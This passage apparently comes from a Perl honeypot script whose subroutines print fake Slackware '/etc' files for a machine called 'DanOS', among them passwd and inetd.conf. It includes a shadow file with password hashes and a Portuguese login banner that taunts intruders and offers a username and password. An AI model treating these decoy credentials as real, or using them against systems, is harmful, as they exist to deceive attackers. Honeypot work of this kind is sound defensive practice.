DT38400# B38400 CS8 CLOCAL CRTSCTS # B38400 SANE -ISTRIP CLOCAL CRTSCTS #\@S login: #DT38400

# 19200 fixed baud Dumb Terminal entry
DT19200# B19200 CS8 CLOCAL # B19200 SANE -ISTRIP CLOCAL #\@S login: #DT19200

# 9600 baud Dumb Terminal entry
DT9600# B9600 CS8 CLOCAL # B9600 SANE -ISTRIP CLOCAL #\@S login: #DT9600

# 230400 fixed-baud modem entry
F230400# B230400 CS8 CRTSCTS # B230400 SANE -ISTRIP HUPCL CRTSCTS #\@S login: #F230400
EOT
}

sub cat_18
{
   # /etc/gpm-root.conf
   print STDERR << "EOT"
# sample configuration file for gpm-root
# edit it to please your taste....

button 1 {
  name "ttys"

  ""        f.nop
  "login on a new tty" f.mktty
  ""        f.nop
  "tty  1"  f.jptty  "1"
  "tty  2"  f.jptty  "2"
  "tty  3"  f.jptty  "3"
  "tty  4"  f.jptty  "4"
  ""         f.nop
  "tty  5"  f.jptty   "5"
  "tty  6"  f.jptty   "6"
  "tty  7"  f.jptty   "7"
  "tty  8"  f.jptty   "8"
  ""        f.nop
  "more of them..." {
    
    "tty  9"  f.jptty  "9"
    "tty 10"  f.jptty  "10"
    "tty 11"  f.jptty  "11"
    "tty 12"  f.jptty  "12"
    ""         f.nop
    "tty 13"  f.jptty   "13"
    "tty 14"  f.jptty   "14"
    "tty 15"  f.jptty   "15"
    "tty 16"  f.jptty   "16"
EOT
}

sub cat_19
{
   # /etc/gpm-syn.conf
   print STDERR << "EOT"
/* enabling configuration parameters */
[edge_motion_enabled]        TRUE
[edge_motion_speed_enabled]  TRUE
[corner_taps_enabled]        TRUE
[taps_enabled]               TRUE
[pressure_speed_enabled]     TRUE
[tossing_enabled]            TRUE
[does_toss_use_static_speed] TRUE
/* pressure induced speed related configuration parameters */
[low_pressure]               60
[speed_up_pressure]          60
[pressure_factor]            0.10
[standard_speed_factor]      0.10
/* toss/catch related parameters */
[min_toss_time]              100
[max_toss_time]              300
[toss_cleanup_time]          300
[min_toss_dist]              2
[static_toss_speed]          70
[toss_speed_factor]          0.5
/* edge motion related configuration parameters */
[edge_speed]                 20
/* corner tap actions */
[upper_left_action]          0 (none)
[upper_right_action]         2 (middle)
[lower_left_action]          0 (none)
[lower_right_action]         3 (right)
EOT
}

sub cat_20
{
   # /etc/gpm-twiddler.conf
   print STDERR << "EOT"
#
# This is the configuration file for the twiddler keyboard as used under
# the gpm mouse server
#
# Empty lines and comments are ignored, other lines must follow either
# of the following conventions:
#     chord = value     (e.g.   "L000 = a")
# mod chord = value     (e.g.   "Shift L000 = a")
#
# The "mod" is one of "Shift" "Numeric" "Function" "Control" "Ctrl" "Alt",
# or any abbreviation of those (case independent)
# The special case "Ctrl+Shift" (or "Shift+Ctrl") is supported, but note
# that it can't be abbreviated like C+S or anything like that.
#
# The "chord" value is one of the usual specifications, uppercase only
#
# Value can be a single byte (also as escape sequence), a string with
# double quotes (with escape sequences) or a special name (one of those
# appearing as "string" in dumpkeys, and Up Down Left Right).
# In addition, the strings "Console" and "Exec" are supported. See the
# sample case below.
#
# Escape sequences are \n \r \e \t \a \b, octal ("\243") or hex ("\xff")
# numbers. Any other char is returned unchanged, like \" or \\.

######## Lowercase
R000 = a
0R00 = b
00R0 = c
000R = d
EOT
}

sub cat_21
{
   # /etc/group
   print STDERR << "EOT"
root::0:root,users
bin::1:root,bin,daemon
daemon::2:root,bin,daemon
sys::3:root,bin,adm
adm::4:root,adm,daemon
tty::5:
disk::6:root,adm
lp::7:lp
mem::8:
kmem::9:
wheel::10:root
floppy::11:root
mail::12:mail
news::13:news
uucp::14:uucp
man::15:
games::20:
gdm::42:
nobody::98:nobody
nogroup::99:
users::100:root,pchaz
console:x:101:
EOT
}

sub cat_22
{
   # /etc/host.conf
   print STDERR << "EOT"
order hosts, bind
multi on
EOT
}

sub cat_23
{
   # /etc/hosts
   print STDERR << "EOT"
#
# hosts		This file describes a number of hostname-to-address
#		mappings for the TCP/IP subsystem.  It is mostly
#		used at boot time, when no name servers are running.
#		On small systems, this file can be used instead of a
#		"named" name server.  Just add the names, addresses
#		and any aliases to this file...
#
# By the way, Arnt Gulbrandsen <agulbra\@nvg.unit.no> says that 127.0.0.1
# should NEVER be named with the name of the machine.  It causes problems
# for some (stupid) programs, irc and reputedly talk. :^)
#

# For loopbacking.
127.0.0.1	localhost
# This next entry is technically wrong, but good enough to get TCP/IP apps
# to quit complaining that they can't verify the hostname on a loopback-only
# DanOS box.


# End of hosts.
EOT
}

sub cat_24
{
   # /etc/hosts.allow
   print STDERR << "EOT"
#
# hosts.allow	This file describes the names of the hosts which are
#		allowed to use the local INET services, as decided by
#		the '/usr/sbin/tcpd' server.
#
# Version:	\@(#)/etc/hosts.allow	1.00	05/28/93
#
# Author:	Fred N. van Kempen, <waltje\@uwalt.nl.mugnet.org
#
#

# End of hosts.allow.
EOT
}

sub cat_25
{
   # /etc/hosts.deny
   print STDERR << "EOT"
#
# hosts.deny	This file describes the names of the hosts which are
#		*not* allowed to use the local INET services, as decided
#		by the '/usr/sbin/tcpd' server.
#
# Version:	\@(#)/etc/hosts.deny	1.00	05/28/93
#
# Author:	Fred N. van Kempen, <waltje\@uwalt.nl.mugnet.org
#
#

# End of hosts.deny.
#ALL:  127.0.0.1
EOT
}

sub cat_26
{
   # /etc/hosts.equiv
   print STDERR << "EOT"
#
# hosts.equiv	This file describes the names of the hosts which are
#		to be considered "equivalent", i.e. which are to be
#		trusted enought for allowing rsh(1) commands.
#
# Version:	\@(#)/etc/hosts.equiv	2.00	04/30/93
#
# Author:	Fred N. van Kempen, <waltje\@uwalt.nl.mugnet.org>
#
#

localhost

# End of hosts.equiv.
EOT
}

sub cat_27
{
   # /etc/hosts.lpd
   print STDERR << "EOT"
#
# hosts.lpd	This file describes the names of the hosts which are
#		allowed to use the remote printer services of this
#		host.  This file is used by the LPD subsystem.
#
# Version:	\@(#)/etc/hosts.lpd	2.00	04/30/93
#
# Author:	Fred N. van Kempen, <waltje\@uwalt.nl.mugnet.org
#
#

# End of hosts.lpd.
EOT
}

sub cat_28
{
   # /etc/inetd.conf
   print STDERR << "EOT"
# See "man 8 inetd" for more information.
#
# If you make changes to this file, either reboot your machine or send the
# inetd a HUP signal:
# Do a "ps x" as root and look up the pid of inetd. Then do a
# "kill -HUP <pid of inetd>".
# The inetd will re-read this file whenever it gets that signal.
#
# <service_name> <sock_type> <proto> <flags> <user> <server_path> <args>
#
# The first 4 services are really only used for debugging purposes, so
# we comment them out since they can otherwise be used for some nasty
# denial-of-service attacks.  If you need them, uncomment them.
# echo   	stream	tcp	nowait	root	internal
# echo   	dgram	udp	wait	root	internal
# discard	stream	tcp	nowait	root	internal
# discard	dgram	udp	wait	root	internal
# daytime	stream	tcp	nowait	root	internal
# daytime	dgram	udp	wait	root	internal
# chargen	stream	tcp	nowait	root	internal
# chargen	dgram	udp	wait	root	internal
#time	stream	tcp	nowait	root	internal
#time	dgram	udp	wait	root	internal
#
# These are standard services.
#
#
ftp	stream	tcp	nowait	root	/usr/sbin/tcpd	wu.ftpd -l -i -a
#teste	stream	tcp	nowait	root	/usr/sbin/tcpd	in.teste
#
EOT
}

sub cat_29
{
   # /etc/inittab
   print STDERR << "EOT"
#
# inittab	This file describes how the INIT process should set up
#		the system in a certain run-level.
#
# Version:	\@(#)inittab		2.04	17/05/93	MvS
#                                       2.10    02/10/95        PV
#                                       3.00    02/06/1999      PV
#
# Author:	Miquel van Smoorenburg, <miquels\@drinkel.nl.mugnet.org>
# Modified by:	Patrick J. Volkerding, <volkerdi\@ftp.cdrom.com>
#

# These are the default runlevels in Slackware:
#   0 = halt
#   1 = single user mode
#   2 = unused (but configured the same as runlevel 3)
#   3 = multiuser mode (default Slackware runlevel)
#   4 = X11 with KDM/GDM/XDM (session managers)
#   5 = unused (but configured the same as runlevel 3)
#   6 = reboot

# Default runlevel. (Do not set to 0 or 6)
id:3:initdefault:

# System initialization (runs when system boots).
si:S:sysinit:/etc/rc.d/rc.S

# Script to run when going single user (runlevel 1).
su:1S:wait:/etc/rc.d/rc.K
EOT
}

sub cat_30
{
   # /etc/inputrc
   print STDERR << "EOT"
set meta-flag on
set input-meta on
set convert-meta off
set output-meta on

"\eOd": backward-word
"\eOc": forward-word

# for DanOS console
"\e[1~": beginning-of-line
"\e[4~": end-of-line
"\e[5~": beginning-of-history
"\e[6~": end-of-history
"\e[3~": delete-char
"\e[2~": quoted-insert

# for xterm
"\eOH": beginning-of-line
"\eOF": end-of-line

#for freebsd console
"\e[H": beginning-of-line
"\e[F": end-of-line
EOT
}

sub cat_31
{
   # /etc/issue
   print STDERR << "EOT"
[?7h[40m[2J[8C[0;36m_____   _____   [33m_    _
[7C[36m|  _  | |  ___| [33m| |  | |  _____   ______   _____   _____   ___
[7C[36m| |_| | | |[5C[33m| |__| | |  _  | |____ _| |  _  | |  _  | |  _ \\
[7C[36m|  ___| | |[5C[33m|  __  | | |_| |    / /   | |_| | | |_| | | | | |
[7C[36m| |[5C| |___  [33m| |  | | |  _  |  / /___  |  _  | |  _ <  | |_| |
[7C[36m|_|[5C|_____| [33m|_|  |_| |_| |_| |______| |_| |_| |_| |_| |____/

[31C[37mPCHazard DanOS Box
[29CPowered by Slackware 7















[0m[255D
EOT
}

sub cat_32
{
   # /etc/issue.net
   print STDERR << "EOT"
[?7h[40m[2J[8C[0;36m_____   _____   [33m_    _
[7C[36m|  _  | |  ___| [33m| |  | |  _____   ______   _____   _____   ____
[7C[36m| |_| | | |[5C[33m| |__| | |  _  | |____ _| |  _  | |  _  | |  _ \
[7C[36m|  ___| | |[5C[33m|  __  | | |_| |    / /   | |_| | | |_| | | | | |
[7C[36m| |[5C| |___  [33m| |  | | |  _  |  / /___  |  _  | |  _ \  | |_| |
[7C[36m|_|[5C|_____| [33m|_|  |_| |_| |_| |______| |_| |_| |_| \_\ |____/

[31C[37mPCHazard DanOS Box
[29CPowered by Slackware 7

[14C[1;34mSe voce esta tentanto pegar root na minha maquina,
[16CUse o Login [0;31mpchaz [1;34me senha [0;31mpchaz [1;34me boa sorte...












[0m[255D
EOT
}

sub cat_33
{
   # /etc/ld.so.cache
   print STDERR << "EOT"
EOT
}

sub cat_34
{
   # /etc/ld.so.conf
   print STDERR << "EOT"
/usr/local/lib
/usr/X11R6/lib
/usr/i386-slackware-DanOS/lib
/usr/i386-slackware-DanOS-gnulibc1/lib
/usr/i386-slackware-DanOS-gnuaout/lib
/usr/openwin/lib
/opt/kde/lib
/usr/src/DanOS-2.2.13/include/
/usr/local/lib/
EOT
}

sub cat_35
{
   # /etc/lilo.conf
   print STDERR << "EOT"
# LILO configuration file
# generated by 'liloconfig'
#
# Start LILO global section
boot = /dev/hda
message = /boot/boot_message.txt
prompt
timeout = 1200
# VESA framebuffer console \@ 640x480x256
vga = 769
# Normal VGA console
# vga = normal
# VESA framebuffer console \@ 1024x768x64k
# vga=791
# VESA framebuffer console \@ 1024x768x32k
# vga=790
# VESA framebuffer console \@ 1024x768x256
# vga=773
# VESA framebuffer console \@ 800x600x64k
# vga=788
# VESA framebuffer console \@ 800x600x32k
# vga=787
# VESA framebuffer console \@ 800x600x256
# vga=771
# VESA framebuffer console \@ 640x480x64k
# vga=785
# VESA framebuffer console \@ 640x480x32k
# vga=784
# VESA framebuffer console \@ 640x480x256
# vga=769
EOT
}

sub cat_36
{
   # /etc/login.access
   print STDERR << "EOT"
# \$Id: login.access,v 1.2 1996/09/10 02:45:04 marekm Exp \$
#
# Login access control table.
# 
# When someone logs in, the table is scanned for the first entry that
# matches the (user, host) combination, or, in case of non-networked
# logins, the first entry that matches the (user, tty) combination.  The
# permissions field of that table entry determines whether the login will 
# be accepted or refused.
# 
# Format of the login access control table is three fields separated by a
# ":" character:
# 
# 	permission : users : origins
# 
# The first field should be a "+" (access granted) or "-" (access denied)
# character. 
#
# The second field should be a list of one or more login names, group
# names, or ALL (always matches). A pattern of the form user\@host is
# matched when the login name matches the "user" part, and when the
# "host" part matches the local machine name.
#
# The third field should be a list of one or more tty names (for
# non-networked logins), host names, domain names (begin with "."), host
# addresses, internet network numbers (end with "."), ALL (always
# matches) or LOCAL (matches any string that does not contain a "."
# character).
#
# If you run NIS you can use \@netgroupname in host or user patterns; this
EOT
}

sub cat_37
{
   # /etc/login.defs
   print STDERR << "EOT"
#
# /etc/login.defs - Configuration control definitions for the login package.
#
#	\$Id: login.defs.DanOS,v 1.10 1999/03/07 19:14:33 marekm Exp \$
#
# Three items must be defined:  MAIL_DIR, ENV_SUPATH, and ENV_PATH.
# If unspecified, some arbitrary (and possibly incorrect) value will
# be assumed.  All other items are optional - if not specified then
# the described action or option will be inhibited.
#
# Comment lines (lines beginning with "#") and blank lines are ignored.
#
# Modified for DanOS.  --marekm

#
# Delay in seconds before being allowed another attempt after a login failure
#
FAIL_DELAY		0

#
# Enable additional passwords upon dialup lines specified in /etc/dialups.
#
DIALUPS_CHECK_ENAB	yes

#
# Enable logging and display of /var/log/faillog login failure info.
#
FAILLOG_ENAB		yes

#
EOT
}

sub cat_38
{
   # /etc/magic
   print STDERR << "EOT"
# Magic data for file(1) command.
# Format is described in magic(5).
# Don't edit this file, edit /etc/magic or send your suggested inclusions to
# this file to submit\@bugs.debian.org with `Package: file' as the first line
# in the body of the message.

#------------------------------------------------------------------------------
# adventure: file(1) magic for Adventure game files
#
# from Allen Garvin <earendil\@faeryland.tamu-commerce.edu>
# Edited by Dave Chapeskie <dchapes\@ddm.on.ca> Jun 28, 1998
#
# ALAN
# I assume there are other, lower versions, but these are the only ones I
# saw in the archive.
0	beshort	0x0206	ALAN text adventure code data
>2	byte	<10	version 2.6%d

# Conflicts with too much other stuff!
# Infocom
# (Note: to avoid false matches Z-machine version 1 and 2 are not
# recognized since only the oldest Zork I and II used them.  Similarly
# there are 4 Infocom games that use verion 4 that are not recognized.)
#0	byte	3	Infocom game data (Z-machine 3,
#>2	beshort	<0x7fff	Release %3d,
#>26	beshort >0	Size %d*2
#>18	string	>\0	Serial %.6s)
#0	byte	5	Infocom game data (Z-machine 5,
#>2	beshort	<0x7fff	Release %3d,
#>26	beshort >0	Size %d*4
EOT
}

sub cat_39
{
   # /etc/mail.rc
   print STDERR << "EOT"
set ask askcc append dot save crt
ignore Received Message-Id Resent-Message-Id Status Mail-From Return-Path Via
EOT
}

sub cat_40
{
   # /etc/modules.conf
   print STDERR << "EOT"
alias net-pf-4 off
alias net-pf-5 off
EOT
}

sub cat_41
{
   # /etc/motd
   print STDERR << "EOT"
[H[J
EOT
}

sub cat_42
{
   # /etc/mtab
   print STDERR << "EOT"
/dev/hda5 / ext2 rw 0 0
/dev/hda1 /mnt/w95 vfat rw 0 0
none /dev/pts devpts rw,gid=5,mode=620 0 0
none /proc proc rw 0 0
EOT
}

sub cat_43
{
   # /etc/named.boot
   print STDERR << "EOT"
;
; Uma configura��o de servidor de nomes somente para cache
;
directory                              /var/named
cache           .                      named.ca
primary         0.0.127.in-addr.arpa   named.local
EOT
}

sub cat_44
{
   # /etc/named.conf
   print STDERR << "EOT"
// generated by named-bootconf.pl

options {
	directory "/var/named";
	/*
	 * If there is a firewall between you and nameservers you want
	 * to talk to, you might need to uncomment the query-source
	 * directive below.  Previous versions of BIND always asked
	 * questions using port 53, but BIND 8.1 uses an unprivileged
	 * port by default.
	 */
	// query-source address * port 53;
};

// 
// a caching only nameserver config
// 
zone "." {
	type hint;
	file "named.ca";
};

zone "0.0.127.in-addr.arpa" {
	type master;
	file "named.local";
};

zone "pchazard.net" {
	notify no;
	type master;
EOT
}

sub cat_45
{
   # /etc/netgroup
   print STDERR << "EOT"
# This file is part of the YP server package -- see 'man netgroup'
#
# netgroup	The netgroup file. Entries look like this:
#
#		   netgroup  (host,user,domain)  (host,user,domain) ..
#
#		So for example a netgroup for powerusers could be:
#
#		   powerusers  (,miquels,) (,torvalds,) (,fubar,)
#
#		And an entry in the password file like
#
#		   +\@powerusers:::::: 
#		   +:*:::::/etc/NoShell
#
# 		would give access only to the users in "powerusers", while the
# 		other users would be known to the system but have an invalid
#		shell AND an invalid password (with DanOS, you can also
#		override the password field).
#

# powerusers (,miquels,) (,torvalds,) (,fubar,)
# ourhosts   (picard,,) (enterprise,,) (laforge,,) (Q,,)
EOT
}

sub cat_46
{
   # /etc/networks
   print STDERR << "EOT"
#
# networks	This file describes a number of netname-to-address
#		mappings for the TCP/IP subsystem.  It is mostly
#		used at boot time, when no name servers are running.
#

loopback	127.0.0.0
localnet	127.0.0.0

# End of networks.
EOT
}

sub cat_47
{
   # /etc/organization
   print STDERR << "EOT"
I need to put my ORGANIZATION here.
EOT
}

sub cat_48
{
   # /etc/papd.conf
   print STDERR << "EOT"
# Attributes are:
#
#	Name Type Default	Description
#	pd   str  ".ppd"	Pathname to ppd file.
#	pr   str  "lp"		LPD printer name.
#	op   str  "operator"	Operator name, for LPD spooling.
#
# Some examples:
#
#	On many systems (notably not Solaris), no papd.conf is required,
#	since papd shares the same defaults as lpd.
#
#	A simple example:
#
#		terminator:\
#			:pr=lp:op=wes:\
#			:pd=/usr/share/lib/ppd/HPLJ_4M.PPD:
#
#	Note also that papd.conf can list several printers.
EOT
}

sub cat_49
{
   # /etc/passwd
   print STDERR << "EOT"
root:x:0:0:,,,:/root:/bin/bash
bin:x:1:1:bin:/bin:
daemon:x:2:2:daemon:/sbin:
adm:x:3:4:adm:/var/log:
lp:x:4:7:lp:/var/spool/lpd:
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:
news:x:9:13:news:/usr/lib/news:
uucp:x:10:14:uucp:/var/spool/uucppublic:
operator:x:11:0:operator:/root:/bin/bash
games:x:12:100:games:/usr/games:
ftp:x:14:1::/home/ftp:/bin/bash
gdm:x:42:42:GDM:/var/state/gdm:/bin/bash
nobody:x:99:99:nobody:/:
lorena:x:1000:100:Lorena Padua:/home/lorena:/bin/bash
joao:x:100:100:Joao Gourlart:/home/joao:/bin/bash
EOT
}

sub cat_50
{
   # /etc/profile
   print STDERR << "EOT"
# /etc/profile: This file contains system-wide defaults used by
# all Bourne (and related) shells.

# Set the values for some environment variables:
export OPENWINHOME=/usr/openwin
export MINICOM="-c on"
export MANPATH=/usr/local/man:/usr/man/preformat:/usr/man:/usr/X11R6/man:/usr/openwin/man
export HOSTNAME="`cat /etc/HOSTNAME`"
export LESSOPEN="|lesspipe.sh %s"
export LESS="-M"
export MOZILLA_HOME=/usr/lib/netscape
#export GSVGAMODE=G800X600X256

# Set the default system \$PATH:
PATH="/usr/local/bin:/usr/bin:/bin:/usr/X11R6/bin:\$OPENWINHOME/bin:/usr/games"

# For root users, ensure that /usr/local/sbin, /usr/sbin, and /sbin are in
# the \$PATH.  Some means of connection don't add these by default (sshd comes
# to mind).
if [ "`id -u`" = "0" ]; then
  echo \$PATH | grep /usr/local/sbin 1> /dev/null 2> /dev/null
  if [ ! \$? = 0 ]; then
    PATH=/usr/local/sbin:/usr/sbin:/sbin:\$PATH
  fi
fi

# For non-root users, add the current directory to the search path:
if [ ! "`id -u`" = "0" ]; then
 PATH="\$PATH:."
fi
EOT
}

sub cat_51
{
   # /etc/protocols
   print STDERR << "EOT"
#
# protocols	This file describes the various protocols that are
#		available from the TCP/IP subsystem.  It should be
#		consulted instead of using the numbers in the ARPA
#		include files, or, worse, just guessing them.
#

ip	0	IP	# internet protocol, pseudo protocol number
icmp	1	ICMP	# internet control message protocol
igmp	2	IGMP	# internet group multicast protocol
ggp	3	GGP	# gateway-gateway protocol
tcp	6	TCP	# transmission control protocol
pup	12	PUP	# PARC universal packet protocol
udp	17	UDP	# user datagram protocol
idp	22	IDP	# WhatsThis?
raw	255	RAW	# RAW IP interface

# End.
EOT
}

sub cat_52
{
   # /etc/resolv.conf
   print STDERR << "EOT"
domain localhost
nameserver 127.0.0.1
EOT
}

sub cat_53
{
   # /etc/rpc
   print STDERR << "EOT"
#ident	"\@(#)rpc	1.11	95/07/14 SMI"	/* SVr4.0 1.2	*/
#
#	rpc
#
portmapper	100000	portmap sunrpc rpcbind
rstatd		100001	rstat rup perfmeter rstat_svc
rusersd		100002	rusers
nfs		100003	nfsprog
ypserv		100004	ypprog
mountd		100005	mount showmount
ypbind		100007
walld		100008	rwall shutdown
yppasswdd	100009	yppasswd
etherstatd	100010	etherstat
rquotad		100011	rquotaprog quota rquota
sprayd		100012	spray
3270_mapper	100013
rje_mapper	100014
selection_svc	100015	selnsvc
database_svc	100016
rexd		100017	rex
alis		100018
sched		100019
llockmgr	100020
nlockmgr	100021
x25.inr		100022
statmon		100023
status		100024
bootparam	100026
ypupdated	100028	ypupdate
EOT
}

sub cat_54
{
   # /etc/securetty
   print STDERR << "EOT"
# This file defines which devices root can log in on.

# These are the ttys on the physical console:
console
tty1
tty2
tty3
tty4
tty5
tty6
tty7
tty8

# These are remote ttys, and uncommenting them might be less than fully secure:
#ttyS0
#ttyS1
#ttyS2
#ttyS3
#ttyp0
#ttyp1
#ttyp2
#ttyp3
EOT
}

sub cat_55
{
   # /etc/services
   print STDERR << "EOT"
#
# Network services, Internet style
#
# Note that it is presently the policy of IANA to assign a single well-known
# port number for both TCP and UDP; hence, most entries here have two entries
# even if the protocol doesn't support UDP operations.
# Updated from RFC 1340, ``Assigned Numbers'' (July 1992).  Not all ports
# are included, only the more common ones.
#
#	from: \@(#)services	5.8 (Berkeley) 5/9/91
#	\$Id: services,v 1.9 1993/11/08 19:49:15 cgd Exp \$
#
tcpmux		1/tcp		# TCP port service multiplexer
teste		2/tcp
echo		7/tcp
echo		7/udp
discard		9/tcp		sink null
discard		9/udp		sink null
systat		11/tcp		users
daytime		13/tcp
daytime		13/udp
netstat		15/tcp
qotd		17/tcp		quote
msp		18/tcp		# message send protocol
msp		18/udp		# message send protocol
chargen		19/tcp		ttytst source
chargen		19/udp		ttytst source
ftp-data        20/tcp          # File Transfer [Default Data]
ftp-data        20/udp          # File Transfer [Default Data]
ftp             21/tcp          # File Transfer [Control]
EOT
}

sub cat_56
{
   # /etc/shadow
   print STDERR << "EOT"
root:\$1\$0HX0uSvw\$yBr9ejPbY71UG0RIwH61g0:11355:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
adm:*:9797:0:::::
lp:*:9797:0:::::
sync:*:9797:0:::::
shutdown:*:9797:0:::::
halt:*:9797:0:::::
mail:*:9797:0:::::
news:*:9797:0:::::
uucp:*:9797:0:::::
operator:*:9797:0:::::
games:*:9797:0:::::
ftp:*:9797:0:::::
gdm:*:9797:0:::::
nobody:*:9797:0:::::
lorena:\$1\$yKDuSr2s\$QG2RCIhFOXvGw7P4aQjry.:11355:0:99999:7:::
joao:\$1\$o6puSr20\$R08MqU.W43RSK7.QOcZG61:11355:0:99999:7:::
EOT
}

sub cat_57
{
   # /etc/shells
   print STDERR << "EOT"
/bin/sh
/bin/bash
/bin/tcsh
/bin/csh
/bin/ash
/bin/zsh
/dev/null
EOT
}

sub cat_58
{
   # /etc/danOS-version
   print STDERR << "EOT"

DanOS localhost 1.0.0 #127 Thu Oct 21 13:13:20 CDT 2001 i686 unknown
EOT
}

sub cat_59
{
   # /etc/snooptab
   print STDERR << "EOT"
# /etc/snooptab
#
# these display directly on the specified tty.. no client necessary
#
# tty		snoopdev	type	execpgm
#
/dev/tty11	/dev/ttyp0	login	/bin/login
/dev/tty12	/dev/ttyp1	login	/bin/login
#
#
# the 'socket' snoop-device is for use with the ttysnoop client (any tty not
# listed above will match the wildcard)
#
*		socket		login	/bin/login
#
# remember to inform your incoming daemons that /usr/sbin/ttysnoops is 
# the login program
#
# example:  (for /etc/inetd.conf)
# telnet stream tcp nowait root /usr/sbin/tcpd /usr/sbin/in.telnetd -L /usr/sbin/ttysnoops
#
# example /etc/inittab (using agetty):
# s2:23:respawn:/sbin/getty 38400 ttyS2 vt100 -l /usr/sbin/ttysnoops
#
# or, if you're using mgetty:   (/etc/mgetty/login.config) replace:
# *	  -       -       /bin/login  \\@
# with:
# *       -       -       /usr/sbin/ttysnoops \@
EOT
}

sub cat_60
{
   # /etc/syslog.conf
   print STDERR << "EOT"
# /etc/syslog.conf
# For info about the format of this file, see "man syslog.conf" (the BSD man
# page), and /usr/doc/sysklogd/README.DanOS.
#

*.=info						/usr/adm/info
*.=info						/dev/tty9
*.=notice					/usr/adm/messages
*.=notice					/dev/tty10
*.=debug					/usr/adm/debug
*.=debug					/dev/tty10

# We don't log messages of level 'warn'.  Why?  Because if you're running
# a news site (with INN), each and every article processed generates a
# warning and a disk access.  This slows news processing to a crawl.
# If you want to log warnings, you'll need to uncomment this line:
#*.warn						/usr/adm/syslog
*.err						/usr/adm/syslog

#
# This might work instead to log on a remote host:
# *			\@hostname

daemon.alert					/dev/tty10
EOT
}

sub cat_61
{
   # /etc/termcap
   print STDERR << "EOT"
# [Slackware note:  If you're looking for a big, full-featured termcap
#  you can find one on any Slackware FTP site or CD-ROM, as the file
#  source/a/etc/termcap-huge ]
#
# From: miquels\@drinkel.ow.org (Miquel van Smoorenburg)
#
# Okay guys, here is a shorter termcap that does have most
# capabilities and is ncurses compatible. If it works for you
# I'd like to hear about it.
# 
# Some entries in termcap 2.0.7 are too long and your programs
# may complain "tgetent: warning: termcap entry too long". Here is
a smaller termcap. But it may not cover as many terminals as the one
# in termcap 2.0.7. You can install it as /etc/termcap.
#
# termcap	Termcap entries for the VT family.
#		All termcap entries have been freed of the 'ks' and
#		'ke' entries, that put the keypad into applications
#		mode. This is a generally misused entry, not ment
#		for the vt100 "applications" mode. Now cursor and
#		function keys will work in all programs.
#
#		Also, there is a "generic" vt entry with common
#		entries for all terminals, on which all other entries
#		are built.
#
# Version:	\@(#) vt-termcap 1.37 12-Mar-1996 MvS
#

# Generic VT entry.
EOT
}

sub cat_62
{
   # /etc/wgetrc
   print STDERR << "EOT"
###
### Sample Wget initialization file .wgetrc
###

## You can use this file to change the default behaviour of wget or to
## avoid having to type many many command-line options. This file does
## not contain a comprehensive list of commands -- look at the manual
## to find out what you can put into this file.
## 
## Wget initialization file can reside in /usr/local/etc/wgetrc
## (global, for all users) or \$HOME/.wgetrc (for a single user).
##
## To use any of the settings in this file, you will have to uncomment
## them (and probably change them).


##
## Global settings (useful for setting up in /usr/local/etc/wgetrc).
## Think well before you change them, since they may reduce wget's
## functionality, and make it behave contrary to the documentation:
##

# You can set retrieve quota for beginners by specifying a value
# optionally followed by 'K' (kilobytes) or 'M' (megabytes).  The
# default quota is unlimited.
#quota = inf

# You can lower (or raise) the default number of retries when
# downloading a file (default is 20).
#tries = 20
EOT
}

sub cat_63
{
   # /etc/default/getty.ttyS1
   print STDERR << "EOT"
CLEAR = NO
HANGUP=YES
INIT="" ATZ\r OK
WAITFOR=RING
CONNECT="" ATA\r CONNECT \s\A
EOT
}

sub cat_64
{
   # /etc/default/uugetty.ttyS0-sample
   print STDERR << "EOT"
# [ put this file in /etc/uugetty.<line> ]
#
# sample uugetty configuration file for a Hayes compatible modem to allow
# incoming modem connections
#
# this config file sets up uugetty to use the RINGBACK feature for
# answering calls.

# ringback enable.  The defaults are trusted here (and are pretty sane).
# first, one to three rings, then hangup and call back within 6 and 60
# seconds.
RINGBACK=YES

MINRBTIME = 7
MAXRBTIME = 21
INTERRING = 6
MINRINGS = 1
MAXRINGS = 2

# line to use to do initialization.  All INIT, OFF, and WAITFOR functions
# are handled on this line.  If this line is not specified, any other
# program that wants to share the line (like kermit, uucp, seyon) will 
# fail.  This line will also be checked for lockfiles.
#
# format: <line> (without the /dev/)
INITLINE=cua3

# timeout to disconnect if idle...
TIMEOUT=60
EOT
}

sub cat_65
{
   # /etc/default/uugetty.ttyS1
   print STDERR << "EOT"
CLEAR = NO
HANGUP=YES
#DEBUG=777
DEBUG=010
INIT="" ATS0=1\r OK
########ALTLOCK=cua1
ALTLOCK=modem
ALTLINE=cua1
#WAITFOR=RING
#CONNECT="" ATs0=1\r CONNECT \s\A
TIMEOUT=60
EOT
}

sub cat_66
{
   # /etc/default/uugetty.ttyS1.1
   print STDERR << "EOT"
CLEAR = NO
HANGUP=YES
DEBUG=010
INIT="" ATZS0=1\r\n OK
##########WAITFOR=RING
#########CONNECT="" ATs0=1\r CONNECT \s\A
TIMEOUT=60
EOT
}

sub cat_67
{
   # /etc/default/uugetty.ttyS1.works
   print STDERR << "EOT"
CLEAR = NO
HANGUP=YES
#DEBUG=777
DEBUG=010
INIT="" ATS0=1\r OK
ALTLOCK=cua1
ALTLINE=cua1
#WAITFOR=RING
#CONNECT="" ATs0=1\r CONNECT \s\A
TIMEOUT=60
EOT
}

sub cat_68
{
   # /etc/default/uugetty.ttyS1~
   print STDERR << "EOT"
CLEAR = NO
HANGUP=YES
#DEBUG=777
INIT="" ATS0=1\r OK
ALTLOCK=cua1
#WAITFOR=RING
#CONNECT="" ATs0=1\r CONNECT \s\A
TIMEOUT=60
EOT
}

sub cat_69
{
   # /etc/default/uugetty.ttyS3.unused
   print STDERR << "EOT"
CLEAR = NO
HANGUP=YES
#DEBUG=777
DEBUG=010
INIT="" ATS0=1\r OK
########ALTLOCK=cua1
ALTLOCK=modem
ALTLINE=cua3
#WAITFOR=RING
#CONNECT="" ATs0=1\r CONNECT \s\A
TIMEOUT=60
EOT
}

sub cat_70
{
   # /etc/dhcpc/dhcpcd-eth0.exe
   print STDERR << "EOT"
#!/bin/sh
echo "(dhcpcd)  IP address changed to \$1" | logger
EOT
}

sub cat_71
{
   # /etc/httpd/conf/access.conf
   print STDERR << "EOT"
##
## access.conf -- Apache HTTP server configuration file
##

# access.conf: Global access configuration
# Online docs at http://www.apache.org/

# This file defines server settings which affect which types of services
# are allowed, and in what circumstances. 

